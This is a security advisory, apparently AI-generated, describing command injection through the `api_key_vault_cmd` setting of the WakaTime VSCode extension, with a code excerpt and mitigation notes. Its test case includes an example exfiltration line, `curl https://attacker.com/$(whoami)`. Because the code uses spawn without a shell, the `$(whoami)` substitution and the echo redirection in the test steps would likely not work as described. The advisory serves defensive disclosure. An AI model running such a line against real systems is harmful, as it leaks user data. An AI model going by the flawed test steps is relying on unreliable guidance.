## Vulnerability List:

### 1. Command Injection via `api_key_vault_cmd`

*   **Description:**
    1.  The extension reads the `api_key_vault_cmd` setting from the configuration file (`~/.wakatime.cfg`).
    2.  The value of `api_key_vault_cmd` is split into command and arguments by spaces.
    3.  The extension uses `child_process.spawn` to execute the command specified in `api_key_vault_cmd` without any sanitization or validation.
    4.  If a user is tricked into setting a malicious command in `api_key_vault_cmd`, the extension will execute it.

*   **Impact:**
    *   Arbitrary command execution on the user's machine with the privileges of the VSCode process.
    *   An attacker could potentially gain full control over the user's system, steal sensitive information, or install malware.

*   **Vulnerability Rank:** High

*   **Currently implemented mitigations:**
    *   None. The code executes the command as provided in the configuration.

*   **Missing mitigations:**
    *   Input validation and sanitization of the `api_key_vault_cmd` setting.
    *   Avoid using `child_process.spawn` to execute user-provided commands. If necessary, use more secure methods to execute external commands, such as explicitly whitelisting allowed commands and sanitizing arguments, or using safer alternatives to `child_process.spawn` if possible.
    *   Principle of least privilege should be applied when executing external commands.

*   **Preconditions:**
    *   The user must have the `api_key_vault_cmd` setting configured in their `~/.wakatime.cfg` file.
    *   An attacker must be able to influence the value of this setting. This could happen if a user is tricked into using a malicious configuration file, or if there's another vulnerability that allows modifying user settings.

*   **Source code analysis:**
    1.  **File:** `/code/src/options.ts`
    2.  **Function:** `getApiKeyFromVaultCmd()`
    3.  **Code Snippet:**
        ```typescript
        public async getApiKeyFromVaultCmd(): Promise<string> {
            try {
              // Use basically the same logic as wakatime-cli to interpret cmdStr
              // https://github.com/wakatime/wakatime-cli/blob/1fd560a/cmd/params/params.go#L697
              const cmdStr = await this.getSettingAsync<string>('settings', 'api_key_vault_cmd');
              if (!cmdStr?.trim()) return '';

              const cmdParts = cmdStr.trim().split(' '); // Split command string by spaces
              if (cmdParts.length === 0) return '';

              const [cmdName, ...cmdArgs] = cmdParts; // Destructure into command and arguments

              const options = Desktop.buildOptions();
              const proc = child_process.spawn(cmdName, cmdArgs, options); // Execute command using child_process.spawn

              // ... rest of the code to handle stdout, stderr, and exit code ...
            } catch (err) {
              this.logger.debug(`Exception while reading API Key Vault Cmd from config file: ${err}`);
              return '';
            }
          }
        ```
    4.  **Vulnerability:** The `child_process.spawn(cmdName, cmdArgs, options)` directly executes the command and arguments derived from the `api_key_vault_cmd` setting without any validation. This allows for command injection if the `api_key_vault_cmd` setting is maliciously crafted.
    5.  **Visualization:**
        ```
        User Config (~/.wakatime.cfg) --> api_key_vault_cmd setting --> cmdStr --> split(' ') --> cmdName, cmdArgs --> child_process.spawn(cmdName, cmdArgs) --> System Command Execution
        ```

*   **Security test case:**
    1.  Open VSCode.
    2.  Open the WakaTime configuration file (`~/.wakatime.cfg`). If it doesn't exist, create it.
    3.  Add or modify the `api_key_vault_cmd` setting in the `[settings]` section with a malicious command. For example:
        ```ini
        [settings]
        api_key_vault_cmd = echo vulnerable > /tmp/wakatime_vuln_test
        ```
    4.  Restart VSCode or reload the WakaTime extension.
    5.  Check if the command was executed. In this case, check if the file `/tmp/wakatime_vuln_test` was created and contains the word "vulnerable".
    6.  Alternatively, use a command to exfiltrate data to an attacker-controlled server:
        ```ini
        [settings]
        api_key_vault_cmd = curl https://attacker.com/$(whoami)
        ```
    7.  Monitor network traffic or attacker's server logs to confirm command execution and potential data exfiltration.
